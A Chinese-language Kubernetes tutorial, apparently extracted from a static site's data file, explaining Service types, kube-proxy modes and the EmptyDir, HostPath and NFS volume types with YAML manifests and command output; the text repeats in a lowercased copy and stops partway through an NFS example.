0\n\n# 循环访问测试\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;\n10.244.1.40\n10.244.1.39\n10.244.2.33\n10.244.1.40\n10.244.1.39\n10.244.2.33\n\n# 修改分发策略----sessionAffinity:ClientIP\n\n# 查看ipvs规则【persistent 代表持久】\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr persistent 10800\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# 循环访问测试\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;\n10.244.2.33\n10.244.2.33\n10.244.2.33\n  \n# 删除service\n[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yaml\nservice "service-clusterip" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# HeadLiness 类型的 Service\n\n在某些场景中，开发人员可能不想使用 Service 提供的负载均衡功能，而希望自己来控制负载均衡策略，针对这种情况，kubernetes 提供了 HeadLiness Service，这类 Service 不会分配 Cluster IP，如果想要访问 service，只能通过 service 的域名进行查询。\n\n创建 service-headliness.yaml\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-headliness\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: None # 将clusterIP设置为None，即可创建headliness Service\n  type: ClusterIP\n  ports:\n  - port: 80    \n    targetPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-headliness.yaml\nservice/service-headliness created\n\n# 获取service， 发现CLUSTER-IP未分配\n[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wide\nNAME                 TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE   SELECTOR\nservice-headliness   ClusterIP   None         <none>        80/TCP    11s   app=nginx-pod\n\n# 查看service详情\n[root@k8s-master01 ~]# kubectl describe svc service-headliness  -n dev\nName:              service-headliness\nNamespace:         dev\nLabels:            <none>\nAnnotations:       <none>\nSelector:          app=nginx-pod\nType:              ClusterIP\nIP:                None\nPort:              <unset>  80/TCP\nTargetPort:        80/TCP\nEndpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nSession Affinity:  None\nEvents:            <none>\n\n# 查看域名的解析情况\n[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n/ # cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch dev.svc.cluster.local svc.cluster.local cluster.local\n\n[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.local\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.40\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.39\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# NodePort 类型的 Service\n\n在之前的样例中，创建的 Service 的 ip 地址只有集群内部才可以访问，如果希望将 Service 暴露给集群外部使用，那么就要使用到另外一种类型的 Service，称为 NodePort 类型。NodePort 的工作原理其实就是将 service 的端口映射到 Node 的一个端口上，然后就可以通过 NodeIp:NodePort 来访问 service 了。\n\n\n\n创建 service-nodeport.yaml\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-nodeport\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  type: NodePort # service类型\n  ports:\n  - port: 80\n    nodePort: 30002 # 指定绑定的node的端口(默认的取值范围是：30000-32767), 如果不指定，会默认分配\n    targetPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-nodeport.yaml\nservice/service-nodeport created\n\n# 查看service\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nNAME               TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)       SELECTOR\nservice-nodeport   NodePort   10.105.64.191   <none>        80:30002/TCP  app=nginx-pod\n\n# 接下来可以通过电脑主机的浏览器去访问集群中任意一个nodeip的30002端口，即可访问到pod\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# LoadBalancer 类型的 Service\n\nLoadBalancer 和 NodePort 很相似，目的都是向外部暴露一个端口，区别在于 LoadBalancer 会在集群的外部再来做一个负载均衡设备，而这个设备需要外部环境支持的，外部服务发送到这个设备上的请求，会被设备负载之后转发到集群中。\n\n\n\n\n# ExternalName 类型的 Service\n\nExternalName 类型的 Service 用于引入集群外部的服务，它通过 externalName 属性指定外部一个服务的地址，然后在集群内部访问此 service 就可以访问到外部的服务了。\n\n\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-externalname\n  namespace: dev\nspec:\n  type: ExternalName # service类型\n  externalName: www.baidu.com  #改成ip地址也可以\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl  create -f service-externalname.yaml\nservice/service-externalname created\n\n# 域名解析\n[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.local\nservice-externalname.dev.svc.cluster.local. 30 IN CNAME www.baidu.com.\nwww.baidu.com.          30      IN      CNAME   www.a.shifen.com.\nwww.a.shifen.com.       30      IN      A       39.156.66.18\nwww.a.shifen.com.       30      IN      A       39.156.66.14\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',normalizedContent:'# service 介绍\n\n在 kubernetes 中，pod 是应用程序的载体，我们可以通过 pod 的 ip 来访问应用程序，但是 pod 的 ip 地址不是固定的，这也就意味着不方便直接采用 pod 的 ip 对服务进行访问。\n\n为了解决这个问题，kubernetes 提供了 service 资源，service 会对提供同一个服务的多个 pod 进行聚合，并且提供一个统一的入口地址。通过访问 service 的入口地址就能访问到后面的 pod 服务。\n\n\n\nservice 在很多情况下只是一个概念，真正起作用的其实是 kube-proxy 服务进程，每个 node 节点上都运行着一个 kube-proxy 服务进程。当创建 service 的时候会通过 api-server 向 etcd 写入创建的 service 的信息，而 kube-proxy 会基于监听的机制发现这种 service 的变动，然后它会将最新的 service 信息转换成对应的访问规则。\n\n\n\n规则有 iptables，ipvs 等，简单介绍下 ipvs 规则\n\n[root@node1 ~]# ipvsadm -ln\nip virtual server version 1.2.1 (size=4096)\nprot localaddress:port scheduler flags\n  -> remoteaddress:port           forward weight activeconn inactconn\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n10.97.97.97:80 是 service 提供的访问入口，当访问这个入口的时候，可以发现后面有三个 pod 的服务在等待调用，kube-proxy 会基于 rr（轮询）的策略，将请求分发到其中一个 pod 上去，这个规则会同时在集群内的所有节点上都生成，所以在任何一个节点上访问都可以。\n\nkube-proxy 目前支持三种工作模式:\nuserspace 模式\nuserspace 模式下，kube-proxy 会为每一个 service 创建一个监听端口，发向 cluster ip 的请求被 iptables 规则重定向到 kube-proxy 监听的端口上，kube-proxy 根据 lb 算法选择一个提供服务的 pod 并和其建立链接，以将请求转发到 pod 上。 该模式下，kube-proxy 充当了一个四层负责均衡器的角色。由于 kube-proxy 运行在 userspace 中，在进行转发处理时会增加内核和用户空间之间的数据拷贝，虽然比较稳定，但是效率比较低。\n\n\n\niptables 模式\niptables 模式下，kube-proxy 为 service 后端的每个 pod 创建对应的 iptables 规则，直接将发向 cluster ip 的请求重定向到一个 pod ip。 该模式下 kube-proxy 不承担四层负责均衡器的角色，只负责创建 iptables 规则。该模式的优点是较 userspace 模式效率更高，但不能提供灵活的 lb 策略，当后端 pod 不可用时也无法进行重试。\n\n\n\nipvs 模式\nipvs 模式和 iptables 类似，kube-proxy 监控 pod 的变化并创建相应的 ipvs 规则。ipvs 相对 iptables 转发效率更高。除此以外，ipvs 支持更多的 lb 算法。\n\n\n\n此模式必须安装 ipvs 内核模块，否则会降级为 iptables，开启 ipvs\n\n[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system\n# 修改mode: "ipvs"\n[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system\n[root@node1 ~]# ipvsadm -ln\nip virtual server version 1.2.1 (size=4096)\nprot localaddress:port scheduler flags\n  -> remoteaddress:port           forward weight activeconn inactconn\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# service 类型\n\nservice 的资源清单文件：\n\nkind: service  # 资源类型\napiversion: v1  # 资源版本\nmetadata: # 元数据\n  name: service # 资源名称\n  namespace: dev # 命名空间\nspec: # 描述\n  selector: # 标签选择器，用于确定当前service代理哪些pod\n    app: nginx\n  type: # service类型，指定service的访问方式\n  clusterip:  # 虚拟服务的ip地址\n  sessionaffinity: # session亲和性，支持clientip、none两个选项，可以把同一个源的请求，发到一个具体的pod上\n  ports: # 端口信息\n    - protocol: tcp \n      port: 3017  # service端口\n      targetport: 5003 # pod端口\n      nodeport: 31122 # 主机端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntype：\n\n * clusterip：默认值，它是 kubernetes 系统自动分配的虚拟 ip，只能在集群内部访问\n * nodeport：将 service 通过指定的 node 上的端口暴露给外部，通过此方法，就可以在集群外部访问服务\n * loadbalancer：使用外接负载均衡器完成到服务的负载分发，注意此模式需要外部云环境支持\n * externalname： 把集群外部的服务引入集群内部，直接使用\n\n\n# service 使用\n\n\n# 实验环境准备\n\n在使用 service 之前，首先利用 deployment 创建出 3 个 pod，注意要为 pod 设置 app=nginx-pod 的标签\n创建 deployment.yaml，内容如下：\n\napiversion: apps/v1\nkind: deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n[root@k8s-master01 ~]# kubectl create -f deployment.yaml\ndeployment.apps/pc-deployment created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nname                             ready   status     ip            node     labels\npc-deployment-66cb59b984-8p84h   1/1     running    10.244.1.39   node1    app=nginx-pod\npc-deployment-66cb59b984-vx8vx   1/1     running    10.244.2.33   node2    app=nginx-pod\npc-deployment-66cb59b984-wnncx   1/1     running    10.244.1.40   node1    app=nginx-pod\n\n# 为了方便后面的测试，修改下三台nginx的index.html页面（三台修改的ip地址不一致）\n# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n# echo "10.244.1.39" > /usr/share/nginx/html/index.html\n\n#修改完毕之后，访问测试\n[root@k8s-master01 ~]# curl 10.244.1.39\n10.244.1.39\n[root@k8s-master01 ~]# curl 10.244.2.33\n10.244.2.33\n[root@k8s-master01 ~]# curl 10.244.1.40\n10.244.1.40\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# clusterip 类型的 service\n\n是集群内部地址，只能通过 node 集群内部访问，创建 service-clusterip.yaml 文件\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-clusterip\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: 10.97.97.97 # service的ip地址，如果不写，默认会生成一个\n  type: clusterip\n  ports:\n  - port: 80  # service端口       \n    targetport: 80 # pod端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-clusterip.yaml\nservice/service-clusterip created\n\n# 查看service\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nname                type        cluster-ip    external-ip   port(s)   age   selector\nservice-clusterip   clusterip   10.97.97.97   <none>        80/tcp    13s   app=nginx-pod\n\n# 查看service的详细信息\n# 在这里有一个endpoints列表，里面就是当前service可以负载到的服务入口\n[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n dev\nname:              service-clusterip\nnamespace:         dev\nlabels:            <none>\nannotations:       <none>\nselector:          app=nginx-pod\ntype:              clusterip\nip:                10.97.97.97\nport:              <unset>  80/tcp\ntargetport:        80/tcp\nendpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nsession affinity:  none\nevents:            <none>\n\n# 查看ipvs的映射规则\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# 访问10.97.97.97:80观察效果\n[root@k8s-master01 ~]# curl 10.97.97.97:80\n10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nendpoint\n\nendpoint 是 kubernetes 中的一个资源对象，存储在 etcd 中，用来记录一个 service 对应的所有 pod 的访问地址，它是根据 service 配置文件中 selector 描述产生的。\n\n一个 service 由一组 pod 组成，这些 pod 通过 endpoints 暴露出来，endpoints 是实现实际服务的端点集合。换句话说，service 和 pod 之间的联系是通过 endpoints 实现的。\n\n\n\n负载分发策略\n对 service 的访问被分发到了后端的 pod 上去，目前 kubernetes 提供了两种负载分发策略：\n\n * 如果不定义，默认使用 kube-proxy 的策略，比如随机、轮询\n * 基于客户端地址的会话保持模式，即来自同一个客户端发起的所有请求都会转发到固定的一个 pod 上\n   此模式可以使在 spec 中添加 sessionaffinity:clientip 选项\n\n# 查看ipvs的映射规则【rr 轮询】\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# 循环访问测试\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;\n10.244.1.40\n10.244.1.39\n10.244.2.33\n10.244.1.40\n10.244.1.39\n10.244.2.33\n\n# 修改分发策略----sessionaffinity:clientip\n\n# 查看ipvs规则【persistent 代表持久】\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr persistent 10800\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# 循环访问测试\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;\n10.244.2.33\n10.244.2.33\n10.244.2.33\n  \n# 删除service\n[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yaml\nservice "service-clusterip" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# headliness 类型的 service\n\n在某些场景中，开发人员可能不想使用 service 提供的负载均衡功能，而希望自己来控制负载均衡策略，针对这种情况，kubernetes 提供了 headliness service，这类 service 不会分配 cluster ip，如果想要访问 service，只能通过 service 的域名进行查询。\n\n创建 service-headliness.yaml\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-headliness\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: none # 将clusterip设置为none，即可创建headliness service\n  type: clusterip\n  ports:\n  - port: 80    \n    targetport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-headliness.yaml\nservice/service-headliness created\n\n# 获取service， 发现cluster-ip未分配\n[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wide\nname                 type        cluster-ip   external-ip   port(s)   age   selector\nservice-headliness   clusterip   none         <none>        80/tcp    11s   app=nginx-pod\n\n# 查看service详情\n[root@k8s-master01 ~]# kubectl describe svc service-headliness  -n dev\nname:              service-headliness\nnamespace:         dev\nlabels:            <none>\nannotations:       <none>\nselector:          app=nginx-pod\ntype:              clusterip\nip:                none\nport:              <unset>  80/tcp\ntargetport:        80/tcp\nendpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nsession affinity:  none\nevents:            <none>\n\n# 查看域名的解析情况\n[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n/ # cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch dev.svc.cluster.local svc.cluster.local cluster.local\n\n[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.local\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.1.40\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.1.39\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# nodeport 类型的 service\n\n在之前的样例中，创建的 service 的 ip 地址只有集群内部才可以访问，如果希望将 service 暴露给集群外部使用，那么就要使用到另外一种类型的 service，称为 nodeport 类型。nodeport 的工作原理其实就是将 service 的端口映射到 node 的一个端口上，然后就可以通过 nodeip:nodeport 来访问 service 了。\n\n\n\n创建 service-nodeport.yaml\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-nodeport\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  type: nodeport # service类型\n  ports:\n  - port: 80\n    nodeport: 30002 # 指定绑定的node的端口(默认的取值范围是：30000-32767), 如果不指定，会默认分配\n    targetport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-nodeport.yaml\nservice/service-nodeport created\n\n# 查看service\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nname               type       cluster-ip      external-ip   port(s)       selector\nservice-nodeport   nodeport   10.105.64.191   <none>        80:30002/tcp  app=nginx-pod\n\n# 接下来可以通过电脑主机的浏览器去访问集群中任意一个nodeip的30002端口，即可访问到pod\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# loadbalancer 类型的 service\n\nloadbalancer 和 nodeport 很相似，目的都是向外部暴露一个端口，区别在于 loadbalancer 会在集群的外部再来做一个负载均衡设备，而这个设备需要外部环境支持的，外部服务发送到这个设备上的请求，会被设备负载之后转发到集群中。\n\n\n\n\n# externalname 类型的 service\n\nexternalname 类型的 service 用于引入集群外部的服务，它通过 externalname 属性指定外部一个服务的地址，然后在集群内部访问此 service 就可以访问到外部的服务了。\n\n\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-externalname\n  namespace: dev\nspec:\n  type: externalname # service类型\n  externalname: www.baidu.com  #改成ip地址也可以\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl  create -f service-externalname.yaml\nservice/service-externalname created\n\n# 域名解析\n[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.local\nservice-externalname.dev.svc.cluster.local. 30 in cname www.baidu.com.\nwww.baidu.com.          30      in      cname   www.a.shifen.com.\nwww.a.shifen.com.       30      in      a       39.156.66.18\nwww.a.shifen.com.       30      in      a       39.156.66.14\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',charsets:{cjk:!0}},{title:"kubernetes(十一) 数据存储（挂载卷管理）",frontmatter:{title:"kubernetes(十一) 数据存储（挂载卷管理）",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/610",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/610.kubernetes(%E5%8D%81%E4%B8%80)%20%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%EF%BC%88%E6%8C%82%E8%BD%BD%E5%8D%B7%E7%AE%A1%E7%90%86%EF%BC%89.html",relativePath:"04.运维/60.Kubernetes/610.kubernetes(十一) 数据存储（挂载卷管理）.md",key:"v-2715e687",path:"/kubernetes/610/",headers:[{level:2,title:"基本存储",slug:"基本存储",normalizedTitle:"基本存储",charIndex:419},{level:3,title:"EmptyDir",slug:"emptydir",normalizedTitle:"emptydir",charIndex:353},{level:3,title:"HostPath",slug:"hostpath",normalizedTitle:"hostpath",charIndex:362},{level:3,title:"NFS",slug:"nfs",normalizedTitle:"nfs",charIndex:371},{level:2,title:"高级存储",slug:"高级存储",normalizedTitle:"高级存储",charIndex:378},{level:3,title:"PV",slug:"pv",normalizedTitle:"pv",charIndex:383},{level:3,title:"PVC",slug:"pvc",normalizedTitle:"pvc",charIndex:386},{level:3,title:"生命周期",slug:"生命周期",normalizedTitle:"生命周期",charIndex:11},{level:2,title:"配置存储",slug:"配置存储",normalizedTitle:"配置存储",charIndex:393},{level:3,title:"ConfigMap",slug:"configmap",normalizedTitle:"configmap",charIndex:398},{level:3,title:"Secret",slug:"secret",normalizedTitle:"secret",charIndex:408}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"基本存储 EmptyDir HostPath NFS 高级存储 PV PVC 生命周期 配置存储 ConfigMap Secret",content:'在前面已经提到，容器的生命周期可能很短，会被频繁地创建和销毁。那么容器在销毁时，保存在容器中的数据也会被清除。这种结果对用户来说，在某些情况下是不乐意看到的。为了持久化保存容器的数据，kubernetes 引入了 Volume 的概念。\n\nVolume 是 Pod 中能够被多个容器访问的共享目录，它被定义在 Pod 上，然后被一个 Pod 里的多个容器挂载到具体的文件目录下，kubernetes 通过 Volume 实现同一个 Pod 中不同容器之间的数据共享以及数据的持久化存储。Volume 的生命容器不与 Pod 中单个容器的生命周期相关，当容器终止或者重启时，Volume 中的数据也不会丢失。\n\nkubernetes 的 Volume 支持多种类型，比较常见的有下面几个：\n\n * 简单存储：EmptyDir、HostPath、NFS\n * 高级存储：PV、PVC\n * 配置存储：ConfigMap、Secret\n\n\n# 基本存储\n\n\n# EmptyDir\n\nEmptyDir 是最基础的 Volume 类型，一个 EmptyDir 就是 Host 上的一个空目录。\n\nEmptyDir 是在 Pod 被分配到 Node 时创建的，它的初始内容为空，并且无须指定宿主机上对应的目录文件，因为 kubernetes 会自动分配一个目录，当 Pod 销毁时， EmptyDir 中的数据也会被永久删除。 EmptyDir 用途如下：\n\n * 临时空间，例如用于某些应用程序运行时所需的临时目录，且无须永久保留\n * 一个容器需要从另一个容器中获取数据的目录（多容器共享目录）\n\n接下来，通过一个容器之间文件共享的案例来使用一下 EmptyDir。\n\n在一个 Pod 中准备两个容器 nginx 和 busybox，然后声明一个 Volume 分别挂在到两个容器的目录中，然后 nginx 容器负责向 Volume 中写日志，busybox 中通过命令将日志内容读到控制台。\n\n\n\n创建一个 volume-emptydir.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-emptydir\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:  # 将logs-volume挂在到nginx容器中，对应的目录为 /var/log/nginx\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] # 初始命令，动态读取指定文件中内容\n    volumeMounts:  # 将logs-volume 挂在到busybox容器中，对应的目录为 /logs\n    - name: logs-volume\n      mountPath: /logs\n  volumes: # 声明volume， name为logs-volume，类型为emptyDir\n  - name: logs-volume\n    emptyDir: {}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yaml\npod/volume-emptydir created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wide\nNAME                  READY   STATUS    RESTARTS   AGE      IP       NODE   ...... \nvolume-emptydir       2/2     Running   0          97s   10.42.2.9   node1  ......\n\n# 通过podIp访问nginx\n[root@k8s-master01 ~]# curl 10.42.2.9\n......\n\n# 通过kubectl logs命令查看指定容器的标准输出\n[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c busybox\n10.42.1.0 - - [27/Jun/2021:15:08:54 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.29.0" "-"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# HostPath\n\nEmptyDir 中数据不会被持久化，它会随着 Pod 的结束而销毁，如果想简单的将数据持久化到主机中，可以选择 HostPath。\n\nHostPath 就是将 Node 主机中一个实际目录挂在到 Pod 中，以供容器使用，这样的设计就可以保证 Pod 销毁了，但是数据依据可以存在于 Node 主机上。\n\n\n\n创建一个 volume-hostpath.yaml：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-hostpath\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"]\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /logs\n  volumes:\n  - name: logs-volume\n    hostPath: \n      path: /root/logs #宿主机目录\n      type: DirectoryOrCreate  # 目录存在就使用，不存在就先创建后使用\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n> 关于 type 的值的一点说明：\n> DirectoryOrCreate 目录存在就使用，不存在就先创建后使用\n> Directory 目录必须存在\n> FileOrCreate 文件存在就使用，不存在就先创建后使用\n> File 文件必须存在\n> Socket unix 套接字必须存在\n> CharDevice 字符设备必须存在\n> BlockDevice 块设备必须存在\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yaml\npod/volume-hostpath created\n\n# 查看Pod\n[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wide\nNAME                  READY   STATUS    RESTARTS   AGE   IP             NODE   ......\npod-volume-hostpath   2/2     Running   0          16s   10.42.2.10     node1  ......\n\n#访问nginx\n[root@k8s-master01 ~]# curl 10.42.2.10\n\n# 接下来就可以去host的/root/logs目录下查看存储的文件了\n###  注意: 下面的操作需要到Pod所在的节点运行（案例中是node1）\n[root@node1 ~]# ls /root/logs/\naccess.log  error.log\n\n# 同样的道理，如果在此目录下创建一个文件，到容器中也是可以看到的\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n> 注意：Pod 被 k8s 部署在哪个 Node，文件就在那个 Node 上挂载\n\n\n# NFS\n\nHostPath 可以解决数据持久化的问题，但是一旦 Node 节点故障了，Pod 如果转移到了别的节点，又会出现问题了，此时需要准备单独的网络存储系统，比较常用的用 NFS、CIFS。\n\nNFS 是一个网络文件存储系统，可以搭建一台 NFS 服务器，然后将 Pod 中的存储直接连接到 NFS 系统上，这样的话，无论 Pod 在节点上怎么转移，只要 Node 跟 NFS 的对接没问题，数据就可以成功访问。\n\n\n\n1）首先要准备 nfs 的服务器，这里为了简单，直接是 master 节点做 nfs 服务器\n\n# 在nfs上安装nfs服务\n[root@nfs ~]# yum install nfs-utils -y\n\n# 准备一个共享目录\n[root@nfs ~]# mkdir /root/data/nfs -pv\n\n# 将共享目录以读写权限暴露给192.168.5.0/24网段中的所有主机\n[root@nfs ~]# vim /etc/exports\n[root@nfs ~]# more /etc/exports\n/root/data/nfs     192.168.5.0/24(rw,no_root_squash)\n\n# 启动nfs服务\n[root@nfs ~]# systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2）接下来，要在的每个 node 节点上都安装下 nfs，这样的目的是为了 node 节点可以驱动 nfs 设备\n\n# 在node上安装nfs服务，注意不需要启动\n[root@k8s-master01 ~]# yum install nfs-utils -y\n\n\n1\n2\n\n\n3）接下来，就可以编写 pod 的配置文件了，创建 volume-nfs.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-nfs\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] \n    volumeMounts:\n    - name: logs-volume\n      mountPath: /logs\n  volumes:\n  - name: logs-volume\n    nfs:\n      server: 192.168.5.6  #nfs服务器地址\n      path: /root/data/nfs 